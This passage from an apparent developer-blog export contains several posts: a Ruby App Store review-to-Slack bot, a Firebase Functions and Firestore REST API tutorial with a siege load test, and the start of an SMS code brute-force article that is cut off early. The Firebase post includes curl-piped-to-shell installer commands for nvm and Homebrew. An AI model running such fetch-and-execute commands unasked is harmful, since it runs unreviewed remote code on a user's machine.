‚Äî AssemblyFastlane and Spaceship are both written in Ruby, so we also need to use Ruby to create this Bot tool.We can create a reviewBot.rb file, and to run it, simply enter the following in the Terminal:ruby reviewBot.rbDone. ( *For more Ruby environment issues, see the tips at the end)First, since the original get_reviews API parameters do not meet our needs; what I want is review data for all regions and all versions, without filtering, and with pagination support:extension.rb:# Extension Spaceship-&gt;TunesClientmodule Spaceship class TunesClient &lt; Spaceship::Client def get_recent_reviews(app_id, platform, index) r = request(:get, \"ra/apps/#{app_id}/platforms/#{platform}/reviews?index=#{index}&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT\") parse_response(r, 'data')['reviews'] end endendSo we extend a method in TunesClient ourselves, with parameters only including app_id, platform = ios (all lowercase), and index = pagination offset.Next, assemble the login authentication and fetch the review list:get_recent_reviews.rb:index = 0breakWhile = truewhile breakWhile app = Spaceship::Tunes::login(APPStoreConnect account (Email), APPStoreConnect password) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { \\|review\\| index += 1 puts review[\"value\"] }endUse while loop to iterate through all pages and stop when no content is found.Next, add a record of the last latest timestamp, and only notify the newest messages that have not been notified:lastModified.rb:lastModified = 0if File.exists?(\".lastModified\") lastModifiedFile = File.open(\".lastModified\") lastModified = lastModifiedFile.read.to_iendnewLastModified = lastModifiedisFirst = truemessages = []index = 0breakWhile = truewhile breakWhile app = Spaceship::Tunes::login(APPStoreConnect account (Email), APPStoreConnect password) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { \\|review\\| index += 1 if isFirst isFirst = false newLastModified = review[\"value\"][\"lastModified\"] end if review[\"value\"][\"lastModified\"] &gt; lastModified &amp;&amp; lastModified != 0 # Do not send notification on first use messages.append(review[\"value\"]) else breakWhile = false break end }endmessages.sort! { \\|a, b\\| a[\"lastModified\"] &lt;=&gt; b[\"lastModified\"] }messages.each { \\|message\\| notify_slack(message)}File.write(\".lastModified\", newLastModified, mode: \"w+\")Simply use a .lastModified to record the time obtained during the last execution.No notification on first use, otherwise it will spam all at onceFinal step, compose the push notification &amp; send it to Slack:slack.rb:# Slack Botdef notify_slack(review) rating = review[\"rating\"].to_i color = rating &gt;= 4 ? \"good\" : (rating &gt;= 2 ? \"warning\" : \"danger\") like = review[\"helpfulViews\"].to_i &gt; 0 ? \" - #{review[\"helpfulViews\"]} :thumbsup:\" : \"\" date = review[\"edited\"] == false ? \"Created at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" : \"Updated at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" isResponse = \"\" if review[\"developerResponse\"] != nil &amp;&amp; review[\"developerResponse\"]['lastModified'] &lt; review[\"lastModified\"] isResponse = \" (Reply is outdated)\" end edited = review[\"edited\"] == false ? \"\" : \":memo: User updated review#{isResponse}:\" stars = \"‚òÖ\" * rating + \"‚òÜ\" * (5 - rating) attachments = { :pretext =&gt; edited, :color =&gt; color, :fallback =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :title =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :text =&gt; review[\"review\"], :author_name =&gt; review[\"nickname\"], :footer =&gt; \"iOS - v#{review[\"appVersionString\"]} - #{review[\"storeFront\"]} - #{date} - &lt;https://appstoreconnect.apple.com/apps/APP_ID/appstore/activity/ios/ratingsResponses\\|Go To App Store&gt;\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' SLACK_WEB_HOOK_URL\" system(cmd, :err =&gt; File::NULL) puts \"#{review[\"id\"]} send Notify Success!\" endSLACK_WEB_HOOK_URL = Incoming WebHook URLFinal Resultappreviewbot.rb:require \"Spaceship\"require 'json'require 'date'# Config$slack_web_hook = \"Target notification web hook url\"$slack_debug_web_hook = \"Notification web hook url for bot errors\"$appstore_account = \"APPStoreConnect account (Email)\"$appstore_password = \"APPStoreConnect password\"$app_id = \"APP_ID\"$platform = \"ios\"# Extension Spaceship-&gt;TunesClientmodule Spaceship class TunesClient &lt; Spaceship::Client def get_recent_reviews(app_id, platform, index) r = request(:get, \"ra/apps/#{app_id}/platforms/#{platform}/reviews?index=#{index}&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT\") parse_response(r, 'data')['reviews'] end endend# Slack Botdef notify_slack(review) rating = review[\"rating\"].to_i color = rating &gt;= 4 ? \"good\" : (rating &gt;= 2 ? \"warning\" : \"danger\") like = review[\"helpfulViews\"].to_i &gt; 0 ? \" - #{review[\"helpfulViews\"]} :thumbsup:\" : \"\" date = review[\"edited\"] == false ? \"Created at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" : \"Updated at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" isResponse = \"\" if review[\"developerResponse\"] != nil &amp;&amp; review[\"developerResponse\"]['lastModified'] &lt; review[\"lastModified\"] isResponse = \" (Customer service reply is outdated)\" end edited = review[\"edited\"] == false ? \"\" : \":memo: User updated the review#{isResponse}:\" stars = \"‚òÖ\" * rating + \"‚òÜ\" * (5 - rating) attachments = { :pretext =&gt; edited, :color =&gt; color, :fallback =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :title =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :text =&gt; review[\"review\"], :author_name =&gt; review[\"nickname\"], :footer =&gt; \"iOS - v#{review[\"appVersionString\"]} - #{review[\"storeFront\"]} - #{date} - &lt;https://appstoreconnect.apple.com/apps/APP_ID/appstore/activity/ios/ratingsResponses\\|Go To App Store&gt;\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' #{$slack_web_hook}\" system(cmd, :err =&gt; File::NULL) puts \"#{review[\"id\"]} send Notify Success!\" endbegin lastModified = 0 if File.exists?(\".lastModified\") lastModifiedFile = File.open(\".lastModified\") lastModified = lastModifiedFile.read.to_i end newLastModified = lastModified isFirst = true messages = [] index = 0 breakWhile = true while breakWhile app = Spaceship::Tunes::login($appstore_account, $appstore_password) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { \\|review\\| index += 1 if isFirst isFirst = false newLastModified = review[\"value\"][\"lastModified\"] end if review[\"value\"][\"lastModified\"] &gt; lastModified &amp;&amp; lastModified != 0 # Do not send notifications on first run messages.append(review[\"value\"]) else breakWhile = false break end } end messages.sort! { \\|a, b\\| a[\"lastModified\"] &lt;=&gt; b[\"lastModified\"] } messages.each { \\|message\\| notify_slack(message) } File.write(\".lastModified\", newLastModified, mode: \"w+\")rescue =&gt; error attachments = { :color =&gt; \"danger\", :title =&gt; \"AppStoreReviewBot Error occurs!\", :text =&gt; error, :footer =&gt; \"*Due to Apple technical restrictions, the precise review scraping feature requires re-login about once a month. Please understand.\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' #{$slack_debug_web_hook}\" system(cmd, :err =&gt; File::NULL) puts errorendAlso added begin‚Ä¶rescue (try‚Ä¶catch) protection. If an error occurs, a Slack notification is sent for us to check (usually due to session expiration). Finally, just add this script to crontab/schedule or other scheduling tools for regular execution!Renderings:Other Free Options AppFollow: Using the Public URL API (RSS) is just acceptable. feedis.io: Using the Private URL API requires providing your account credentials to them. TradeMe/ReviewMe: Self-hosted service (node.js), we originally used this but encountered the issues mentioned above. JonSnow: Self-hosted service (GO), supports one-click deployment to Heroku, author: @saiday Warm Tips1.‚ö†Ô∏èPrivate URL API method requires re-verification every 30 days for accounts with two-factor authentication, and there is currently no solution; if you can create an account without two-factor authentication, you can use it smoothly without issues.#important-note-about-session-duration2.‚ö†Ô∏è Whether free, paid, or self-hosted as in this article; never use a developer account. Always create a separate App Store Connect account with only ‚ÄúCustomer Support‚Äù access to prevent security issues. It is recommended to use rbenv to manage Ruby, as the system‚Äôs built-in version 2.6 may cause conflicts. On macOS Catalina, if you encounter GEM or Ruby environment errors, refer to this reply for a solution. Problem Solved!After the above journey, I have a better understanding of how Slack Bots work; how the iOS App Store crawls review content, and I also tried Ruby! It‚Äôs quite nice to write!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Firebase Firestore + FunctionsÔΩúBuild Testable API Services Fast for Push Notification Analytics", "url": "/posts/zrealm-dev/firebase-firestore-functions-build-testable-api-services-fast-for-push-notification-analytics-9659db1357e4/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, firebase, google-cloud-platform, notifications, ios", "date": "2021-03-24 01:09:34 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Quickly Build a Testable API Service Using Firebase Firestore + FunctionsWhen ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Quickly Build a Testable API Service Using Firebase Firestore + FunctionsWhen Push Notification Statistics Meet Firebase Firestore + FunctionsPhoto by Carlos MuzaPrefacePrecise Push Notification Statistics FunctionRecently, we wanted to add a feature to the app. Before implementation, we could only use the success or failure of sending data from the backend to APNS/FCM as the push notification base and record push notification clicks to calculate the ‚Äúclick-through rate.‚Äù However, this method is very inaccurate because the base includes many invalid devices, such as deleted apps (which may not become invalid immediately) and devices with push permissions turned off, all of which still return a success response when posting from the backend.After iOS 10, you can implement a Notification Service Extension to secretly call an API for statistics when the push notification banner appears. The advantage is high accuracy, as the call only happens when the user actually sees the notification banner. If the app is deleted, notifications are turned off, or banners are disabled, no action occurs. The banner appearance equals a push notification shown, which serves as the base for calculating an accurate click-through rate by comparing it with the number of clicks. For detailed principles and implementation methods, please refer to the previous article: ‚Äúi OS ‚â• 10 Notification Service Extension Application (Swift)‚Äù Currently, testing shows the app‚Äôs loss rate is likely 0%. A common real-world example is Line‚Äôs point-to-point message encryption (push notifications are encrypted and only decrypted on the phone before display).QuestionThe app side‚Äôs workload is actually not that big. Both iOS and Android only need to implement similar functions (but Android is more complicated if targeting the Chinese market, as it requires implementing push notification frameworks for multiple platforms). The bigger challenge lies in backend and server load handling, because sending push notifications simultaneously calls APIs to log records, which can max out the server‚Äôs max connections. This issue is even worse if using RDBMS to store records. If there is data loss in statistics, it usually happens at this stage. Here, you can record logs by writing to files and display statistics when querying. Also, thinking later about the scenario of going out and coming back at the same time, the volume might not be as large as imagined; because push notifications are not sent all at once in hundreds of thousands or millions, but in batches of a few at a time; as long as it can handle the number of requests sent and received in batches simultaneously!PrototypeDue to the issues considered earlier, the backend requires significant effort to research and modify, and the market may not necessarily care about the results; so we decided to first use available resources to create a prototype to test the waters.Here, we chose Firebase services commonly used by apps, including Functions and Firestore features.Firebase FunctionsFunctions is a serverless service provided by Google. You only need to write the program logic, and Google automatically handles the servers and runtime environment, so you don‚Äôt have to worry about server scaling or traffic issues.Firebase Functions are actually Google Cloud Functions but can only be written in JavaScript (node.js). I haven‚Äôt tried it, but if you use Google Cloud Functions with other languages and also import Firebase services, I think it should work as well.Used in an API, it means I can write a node.js file to get a physical URL (e.g., my-project.cloudfunctions.net/getUser) and implement the logic to obtain Request information and provide the corresponding Response. Previously wrote an article about Google Functions: ‚ÄúUsing Python + Google Cloud Platform + Line Bot to Automate Routine Tasks‚Äù Firebase Functions require enabling a Blaze project (pay as you go) to use.Firebase FirestoreFirebase Firestore is a NoSql database used to store and manage data.By integrating Firebase Functions, you can import Firestore during the request to operate the database, then respond to the user, enabling the creation of a simple Restful API service! Let‚Äôs start hands-on practice!Installing Node.js EnvironmentIt is recommended to use NVM, a Node.js version management tool, for installation and management (similar to using pyenv for Python).Go to the NVM Github project and copy the installation shell script:curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.2/install.sh \\| bashIf an error occurs during installation, please make sure you have a ~/.bashrc or ~/.zshrc file. If not, create one using touch ~/.bashrc or touch ~/.zshrc, then run the install script again.Next, you can use nvm install node to install the latest version of node.js.You can run npm --version to verify that npm is installed successfully and check its version:Deploy Firebase FunctionsInstall Firebase-tools:npm install -g firebase-toolsAfter successful installation, please enter the following for first-time use:firebase loginComplete Firebase login authentication.Start Project:firebase initNote the path where Firebase init is located:You're about to initialize a Firebase project in this directory:Here you can choose which Firebase CLI tools to install. Use the ‚Äú‚Üë‚Äù and ‚Äú‚Üì‚Äù keys to navigate and the ‚Äúspacebar‚Äù to select; you can choose to install only ‚ÄúFunctions‚Äù or select ‚ÄúFirestore‚Äù as well.=== Functions Setup Language Selection: ‚ÄúJavaScript‚Äù Regarding ‚Äúuse ESLint to catch probable bugs and enforce style‚Äù syntax style checking, YES / NO both are acceptable. install dependencies with npm? YES ===Emulators SetupYou can test Functions and Firestore features and settings locally without affecting usage limits and without waiting for deployment to go live. Install according to personal needs. I installed it but didn‚Äôt use it‚Ä¶ because it‚Äôs just a minor feature.Coding!Go to the path noted above, find the functions folder, and open the index.js file inside with an editor.index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');admin.initializeApp();exports.hello = functions.https.onRequest((req, res) =&gt; { const targetID = req.query.targetID const action = req.body.action const name = req.body.name res.send({\"targetID\": targetID, \"action\": action, \"name\": name}); return})Paste the above content. We defined a route interface /hello that returns URL Query ?targetID=, POST action, and name parameter information.After editing &amp; saving, return to the console:firebase deploy Remember to run the firebase deploy command after every modification for the changes to take effect.Start verification &amp; deploy to Firebase‚Ä¶You might need to wait a moment. After Deploy complete!, your first Request &amp; Response webpage will be ready!At this point, you can return to the Firebase -&gt; Functions page:You will see the interface and URL location just written.Copy the URL below and paste it into PostMan to test: Remember to select x-www-form-urlencoded for the POST Body.Success!LogWe can use in the code:functions.logger.log(\"log:\", value);Perform log recording.You can view the log results in Firebase -&gt; Functions -&gt; Logs:Example Goal Create an API for adding, updating, deleting, querying articles, and liking postsWe aim to achieve the functionality design of a Restful API, so we can no longer use the pure Path method from the example above. Instead, we need to use the Express framework to accomplish this.POST Add New Articleindex.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Insertapp.post('/', async (req, res) =&gt; { // The POST here refers to the HTTP Method POST const title = req.body.title; const content = req.body.content; const author = req.body.author; if (title == null \\|\\| content == null \\|\\| author == null) { return res.status(400).send({\"message\":\"Parameter error!\"}); } var post = {\"title\":title, \"content\":content, \"author\": author, \"created_at\": new Date()}; await admin.firestore().collection('posts').add(post); res.status(201).send({\"message\":\"Added successfully!\"});});exports.post= functions.https.onRequest(app); // The POST here refers to the /post pathNow we switch to using Express to handle network requests. Here, we first add a POST method for the / path. The last line indicates that all paths are under /post. Next, we will add APIs for update and delete.After successfully deploying with firebase deploy, return to Post Man to test:After a successful Postman request, you can check Firebase -&gt; Firestore to verify if the data has been correctly written:PUT Edit Articleindex.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Updateapp.put(\"/:id\", async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"Article not found!\"}); } else if (title == null \\|\\| content == null \\|\\| author == null) { return res.status(400).send({\"message\":\"Invalid parameters!\"}); } var post = {\"title\":title, \"content\":content, \"author\": author}; await admin.firestore().collection('posts').doc(req.params.id).update(post); res.status(200).send({\"message\":\"Update successful!\"});});exports.post= functions.https.onRequest(app);Deployment &amp; testing method is the same as adding; remember to change the Post Man HTTP method to PUT.DELETE Delete Articleindex.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Deleteapp.delete(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"Post not found!\"}); } await admin.firestore().collection(\"posts\").doc(req.params.id).delete(); res.status(200).send({\"message\":\"Post deleted successfully!\"});})exports.post= functions.https.onRequest(app);Deployment &amp; testing method is the same as adding; remember to change the Post Man HTTP Method to DELETE.Add, modify, and delete are done, now let‚Äôs do the query!SELECT Query Articlesindex.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Select Listapp.get('/', async (req, res) =&gt; { const posts = await admin.firestore().collection('posts').get(); var result = []; posts.forEach(doc =&gt; { let id = doc.id; let data = doc.data(); result.push({\"id\":id, ...data}) }); res.status(200).send({\"result\":result});});// Select Oneapp.get(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"Article not found!\"}); } res.status(200).send({\"result\":{\"id\":doc.id, ...doc.data()}});});exports.post= functions.https.onRequest(app);Deployment &amp; testing method is the same as adding. Remember to change the Post Man HTTP Method to GET and switch the Body back to none.InsertOrUpdate?Sometimes we need to update when a value exists and add when it doesn‚Äôt. In this case, we can use set with merge: true:index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// InsertOrUpdateapp.post(\"/tag\", async (req, res) =&gt; { const name = req.body.name; if (name == null) { return res.status(400).send({\"message\":\"Parameter error!\"}); } var tag = {\"name\":name}; await admin.firestore().collection('tags').doc(name).set({created_at: new Date()}, {merge: true}); res.status(201).send({\"message\":\"Successfully added!\"});});exports.post= functions.https.onRequest(app);Here, using adding a tag as an example, the deployment &amp; testing method is the same as adding. You can see that Firestore does not repeatedly add new data.Article Like CounterAssuming our article data now includes a likeCount field to record the number of likes, how should we proceed?index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Like Postapp.post(\"/like/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"Post not found!\"}); } await admin.firestore().collection('posts').doc(req.params.id).set({likeCount: increment}, {merge: true}); res.status(201).send({\"message\":\"Like successful!\"});});exports.post= functions.https.onRequest(app);Using the increment variable allows you to directly perform the action of retrieving the value and adding 1.High Traffic Article Like CounterBecause Firestore has write speed limits:A document can only be written once per second, so when there are many likes, simultaneous requests may become very slow.The official solution ‚ÄúDistributed counters‚Äù is not very complex technically. It simply uses multiple distributed likeCount fields to count, then sums them up when reading.index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Distributed counters Like Postapp.post(\"/like2/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"Post not found!\"}); } //1~10 await admin.firestore().collection('posts').doc(req.params.id).collection(\"likeCounter\").doc(\"likeCount_\"+(Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}); res.status(201).send({\"message\":\"Like successful!\"});});exports.post= functions.https.onRequest(app);The above method distributes fields to record the Count, avoiding slow writes; however, having too many distributed fields increases read costs ($$), but it should still be cheaper than adding a new record each time a like is made.Using the Siege Tool for Stress TestingInstall siege using brewbrew install siegep.s If you get brew: command not found, please install the brew package manager first:/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"After installation, you can run:siege -c 100 -r 1 -H 'Content-Type: application/json' 'https://us-central1-project.cloudfunctions.net/post/like/id POST {}'Perform stress testing: -c 100 Ôºö100 tasks running concurrently -r 1 ÔºöExecute 1 request per task run -H ‚ÄòContent-Type: application/json‚Äô ÔºöAdd this when using POST requests ‚Äòhttps://us-central1-project.cloudfunctions.net/post/like/id POST {}‚Äô ÔºöPOST URL, Post Body (ex: {‚Äúname‚Äù:‚Äù1234‚Äù} ) After execution, you can see the results:successful_transactions: 100 means 100 transactions were all successful.You can check Firebase -&gt; Firestore to see if there is any Loss Data: Success!Complete Example Codeindex.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Insertapp.post('/', async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; if (title == null \\|\\| content == null \\|\\| author == null) { return res.status(400).send({\"message\":\"Parameter error!\"}); } var post = {\"title\":title, \"content\":content, \"author\": author, \"created_at\": new Date()}; await admin.firestore().collection('posts').add(post); res.status(201).send({\"message\":\"Added successfully!\"});});// Updateapp.put(\"/:id\", async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"Post not found!\"}); } else if (title == null \\|\\| content == null \\|\\| author == null) { return res.status(400).send({\"message\":\"Parameter error!\"}); } var post = {\"title\":title, \"content\":content, \"author\": author}; await admin.firestore().collection('posts').doc(req.params.id).update(post); res.status(200).send({\"message\":\"Updated successfully!\"});});// Deleteapp.delete(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"Post not found!\"}); } await admin.firestore().collection(\"posts\").doc(req.params.id).delete(); res.status(200).send({\"message\":\"Deleted successfully!\"});});// Select Listapp.get('/', async (req, res) =&gt; { const posts = await admin.firestore().collection('posts').get(); var result = []; posts.forEach(doc =&gt; { let id = doc.id; let data = doc.data(); result.push({\"id\":id, ...data}) }); res.status(200).send({\"result\":result});});// Select Oneapp.get(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"Post not found!\"}); } res.status(200).send({\"result\":{\"id\":doc.id, ...doc.data()}});});// InsertOrUpdateapp.post(\"/tag\", async (req, res) =&gt; { const name = req.body.name; if (name == null) { return res.status(400).send({\"message\":\"Parameter error!\"}); } var tag = {\"name\":name}; await admin.firestore().collection('tags').doc(name).set({created_at: new Date()}, {merge: true}); res.status(201).send({\"message\":\"Added successfully!\"});});// Like Postapp.post(\"/like/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"Post not found!\"}); } await admin.firestore().collection('posts').doc(req.params.id).set({likeCount: increment}, {merge: true}); res.status(201).send({\"message\":\"Like successful!\"});});// Distributed counters Like Postapp.post(\"/like2/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"Post not found!\"}); } //1~10 await admin.firestore().collection('posts').doc(req.params.id).collection(\"likeCounter\").doc(\"likeCount_\"+(Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}); res.status(201).send({\"message\":\"Like successful!\"});});exports.post= functions.https.onRequest(app);Back to the topic, push notification statisticsBack to what we initially wanted to do: push notification statistics.index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));const vaildPlatformTypes = [\"iOS\",\"Android\"]const vaildActionTypes = [\"clicked\",\"received\"]// Insert Logapp.post('/', async (req, res) =&gt; { const increment = admin.firestore.FieldValue.increment(1); const platformType = req.body.platformType; const pushID = req.body.pushID; const actionType = req.body.actionType; if (!vaildPlatformTypes.includes(platformType) \\|\\| pushID == undefined \\|\\| !vaildActionTypes.includes(actionType)) { return res.status(400).send({\"message\":\"Parameter error!\"}); } else { await admin.firestore().collection(platformType).doc(actionType+\"_\"+pushID).collection(\"shards\").doc((Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}) res.status(201).send({\"message\":\"Record successful!\"}); }});// View Logapp.get('/:type/:id', async (req, res) =&gt; { // received const receivedDocs = await admin.firestore().collection(req.params.type).doc(\"received_\"+req.params.id).collection(\"shards\").get(); var received = 0; receivedDocs.forEach(doc =&gt; { received += doc.data().count; }); // clicked const clickedDocs = await admin.firestore().collection(req.params.type).doc(\"clicked_\"+req.params.id).collection(\"shards\").get(); var clicked = 0; clickedDocs.forEach(doc =&gt; { clicked += doc.data().count; }); res.status(200).send({\"received\":received,\"clicked\":clicked});});exports.notification = functions.https.onRequest(app);Add Push Notification RecordView Push Notification Statisticshttps://us-centra1-xxx.cloudfunctions.net/notification/iOS/1Also created an interface to track push notification statistics.Pitfalls Because I was not very familiar with node.js usage, at first when adding data I forgot to add await. Combined with write speed limits, this caused data loss under high traffic conditions‚Ä¶PricingDon‚Äôt forget to refer to the pricing strategies of Firebase Functions &amp; Firestore.Functions https://cloud.google.com/functions/pricing?hl=zh-twProcessing TimeInternet Cloud Functions offers a permanent free tier for compute time resources, including GB-seconds and GHz-seconds of compute time. Besides 2 million invocations, the free tier also provides 400,000 GB-seconds and 200,000 GHz-seconds of compute time, along with 5 GB of internet egress per month.Firestore https://cloud.google.com/firestore/pricing?hl=zh-tw Calculation Example Prices may change at any time. Please refer to the official website for the latest information.ConclusionAs stated in the title, ‚ÄúFor Testing Purposes,‚Äù ‚ÄúFor Testing Purposes,‚Äù ‚ÄúFor Testing Purposes,‚Äù it is not recommended to use the above services in a production environment or as the core of a product launch.Expensive and Hard to MigrateI once heard that a fairly large service was built using Firebase. However, as data and traffic grew, the costs skyrocketed. Migrating was also very difficult; the code was manageable, but moving the data was extremely hard. It can only be said that saving a little money early on led to huge losses later, which was not worth it.For Testing OnlyFor the above reasons, I personally recommend using Firebase Functions + Firestore API services only for testing or prototype product demonstrations.More FeaturesFunctions can also integrate Authentication and Storage (file upload), but I haven‚Äôt explored these parts.References https://firebase.google.com/docs/firestore/query-data/queries https://coder.tw/?p=7198 https://firebase.google.com/docs/firestore/solutions/counters#node.js_1 https://javascript.plainenglish.io/firebase-cloud-functions-tutorial-creating-a-rest-api-8cbc51479f80 Further Reading Automate Routine Tasks with Python + Google Cloud Platform + Line Bot i OS ‚â• 10 Notification Service Extension Application (Swift) Forward Gmail Emails to Slack Using Google Apps Script If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "SMS Verification Code SecurityÔΩúPrevent Brute Force Attacks with Python Demonstrations", "url": "/posts/zrealm-dev/sms-verification-code-security-prevent-brute-force-attacks-with-python-demonstrations-99a6cef90190/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, hacker, web-security, password-security, security-token", "date": "2021-03-14 23:57:38 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Security Issues with SMS Verification Code Strength for Password RecoveryUsing...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Security Issues with SMS Verification Code Strength for Password RecoveryUsing Python to Demonstrate the Severity of Brute Force AttacksPhoto by Matt ArtzIntroductionThis article contains little cybersecurity technical content; it is simply a sudden idea that came up while using a certain platform‚Äôs website recently. I decided to casually test its security and ended up discovering an issue.When using the password recovery feature on websites or apps, there are usually two options. One is to enter your username or email, and then a reset password page link containing a token is sent to your inbox. Clicking the link opens the page where you can reset your password. This part generally has no issues unless, as mentioned in the previous article, there are design flaws that cause problems.Another way to recover your password is by entering the linked phone number (mostly used in APP services). A verification code will be sent via SMS to the phone, and entering the code completes the password reset. For convenience, most services use numeric codes as verification codes. Additionally, since iOS ‚â• 11 added the Password AutoFill feature, the keyboard will automatically detect and prompt the verification code when the phone receives it.Check the official documentation, Apple does not provide a format rule for automatically filling verification codes; however, almost all services that support autofill use pure numbers. It is inferred that only numbers are allowed, and complex combinations of numbers and letters are not supported.QuestionBecause numeric passwords can be brute-forced, especially 4-digit codes; the combinations range only from 0000 to 9999, totaling 10,000 combinations; using multiple threads and machines can split the workload for brute-force cracking.Assuming each verification request takes 0.1 seconds to respond, 10,000 